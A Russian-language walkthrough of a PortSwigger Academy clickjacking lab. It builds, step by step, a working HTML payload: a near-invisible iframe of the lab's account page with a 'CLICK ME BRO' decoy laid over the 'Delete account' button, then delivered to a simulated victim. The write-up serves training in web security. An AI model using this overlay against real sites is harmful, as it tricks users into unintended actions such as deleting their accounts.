Логинимся под `wiener:peter`

и видим кнопку `Delete account`

Clickjacking атака состоит в том, чтобы создать подставную фронтенд составляющую, чтобы жертва кликала на видимую ей часть, а на самом деле на бэкенд шла команда о том, что кликнута совершенно другая кнопка

Иначе говоря, мы накладываем надпись `CLICK ME` на кнопку `Delete account`. Жертва жмет на `CLICK ME`, а на самом деле нажимает на `Delete account`

этим мы и займемся
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/1.png)

Переходим в `Exploit server`

Введем в поле `Body` `iframe` на который мы наложим несуществующий на оригинальном сайте элемент кнопки

```
<iframe src="https://0a4400550485c305810e525b0000005d.web-security-academy.net/my-account"></iframe>
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/2.png)
и нажмем `View Exploit`

Увидим, что он в размере окна `iframe` действительно отобразил уязвимый ресурс. Немножко не в том размере, но это поправимо

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/3.png)

Далее необходимо расширить видимую область, и добавить нашу "обманку" - иначе говоря, элемент, которого не существовало, и который будет воспринят пользователем


Дляначала расширим рабочую область, и чуточку затемним оригинальные кнопки и элементы страницы

```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
</style>

<iframe src="https://0a4400550485c305810e525b0000005d.web-security-academy.net/my-account"></iframe>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/4.png)
и нажмем `View Exploit`

Увидим, что у нас вышло изменить видимость оригинальной страницы

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/5.png)

Отлично, теперь добавим кнопку `CLICK ME BRO`

и опустим ее на уровень кнопки `Delete account`, чтобы она была поверх нее
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520;
        left:45;
        z-index: 1;
    }
</style>
<div>CLICK ME BRO</div>
<iframe src="https://0a4400550485c305810e525b0000005d.web-security-academy.net/my-account"></iframe>
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/6.png)
и нажмем `View Exploit`

Увидим, что у нас вышло задуманное
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/7.png)

На следующем шаге изменим видимость элементов оригинальной страницы до 0 (ну ладно, до `0.0000000001`)
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.0000000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520;
        left:45;
        z-index: 1;
    }
</style>
<div>CLICK ME BRO</div>
<iframe src="https://0a4400550485c305810e525b0000005d.web-security-academy.net/my-account"></iframe>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/1.%20Basic%20clickjacking%20with%20CSRF%20token%20protection/pics%20for%20walkthrough/8.png)

Нажмем `Store` -> `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
